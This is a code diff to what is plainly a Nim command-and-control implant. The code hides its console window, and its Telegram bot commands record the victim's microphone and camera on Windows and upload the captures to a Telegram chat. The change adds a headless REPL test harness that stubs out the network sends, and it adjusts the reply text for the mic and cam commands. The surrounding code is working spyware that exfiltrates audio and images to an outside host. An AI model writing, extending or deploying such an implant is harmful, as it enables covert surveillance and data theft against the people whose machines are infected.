@@ -857,6 +857,10 @@ let META_FILE = META_DIR / META_FILE_NAME
 const META_PBKDF2_ITER = 100_000
 const META_AAD = "META-V1"
 
+# Headless REPL test mode (-d:sentinel_repl): network sends become
+# no-ops so handler tests never touch Telegram or stall on retries.
+var gReplMode: bool = false
+
 var agentSecretCache: string = ""
 var agentSecretLock: Lock
 initLock(agentSecretLock)
@@ -1536,6 +1540,7 @@ when defined(c2_tg) or defined(c2_both) or defined(c2_ws):
         inc i
 
   proc tgSendChunk(chunk: string): bool =
+    if gReplMode: return true
     var obj = newJObject()
     obj["chat_id"] = %ChatId
     obj["text"] = %utf8Sanitize(chunk)
@@ -1653,6 +1658,9 @@ when defined(c2_ws):
       inc i, n
     return ok
   proc tgSendDocument(path: string, caption: string = ""): bool =
+    if gReplMode:
+      echo "[sent-doc] " & path
+      return fileExists(path)
     if BotToken.len == 0 or ChatId.len == 0: return false
     if not fileExists(path):
       logMsg("sendDocument: file missing: " & path)
@@ -3780,7 +3788,7 @@ when defined(c2_tg):
           if not tgSendDocument(wavPath, "mic " & $secs & "s"):
             discard tgSendText("[!] mic upload failed")
           try: removeFile(wavPath) except: discard
-          ""
+          "[+] mic " & $secs & "s sent (" & extractFilename(wavPath) & ")"
         else: err
       else: "mic: windows only"
     of "/cam":
@@ -3792,8 +3800,9 @@ when defined(c2_tg):
           if not tgSendDocument(bmpPath, "cam" & $devIdx & " " & info):
             discard tgSendText("[!] cam upload failed")
           try: removeFile(bmpPath) except: discard
-          ""
-        else: info  # error text on failure
+          "[+] cam" & $devIdx & " frame sent (" & info & ")"
+        elif info.len > 0: info
+        else: "[!] cam capture failed"
       else: "cam: windows only"
     of "/hook":
       if webhookEnabled():
@@ -3939,7 +3948,48 @@ when isMainModule:
     when not defined(gui):
       ShowWindow(GetConsoleWindow(), SW_HIDE)
 
-  when defined(c2_ws):
+  when defined(sentinel_repl) and defined(c2_tg):
+    # -------------------------------------------------------------
+    # Headless command REPL (test harness entry point).
+    # Same handleMessage the Telegram loop uses, but driven over
+    # stdin/stdout so tests/test_tg_commands.py can exercise every
+    # handler without touching Telegram. Build:
+    #   nim c -d:sentinel_repl -d:c2_tg --app:console --path:common ...
+    # Protocol: one command per line; replies printed between
+    # ---REPLY--- / ---END--- markers; @file: answers become
+    # [file] <path> <size> lines.
+    # -------------------------------------------------------------
+    randomize()
+    gReplMode = true
+    loadTgMeta()
+    echo "REPL-READY"
+    flushFile(stdout)
+    var line: string
+    while stdin.readLine(line):
+      if line.strip().len == 0: continue
+      if line == "/quit": break
+      var reply = ""
+      try:
+        reply = handleMessage(line, newJObject())
+      except CatchableError as e:
+        reply = "handler err: " & e.msg
+      except Defect as d:
+        reply = "DEFECT: " & d.msg
+      echo "---REPLY---"
+      if reply.startsWith("@file:"):
+        let p = reply[6..^1]
+        echo "[file] " & p & " " &
+             (if fileExists(p): $getFileSize(p) else: "(missing)")
+      else:
+        # Reply text can itself contain the framing markers (e.g.
+        # /cat of this very file) - neutralize them.
+        echo reply.replace("---REPLY---", "- -REPLY- -")
+                  .replace("---END---", "- -END- -")
+      echo "---END---"
+      flushFile(stdout)
+    echo "REPL-BYE"
+
+  elif defined(c2_ws):
     asyncCheck agentLoop()
     runForever()
 
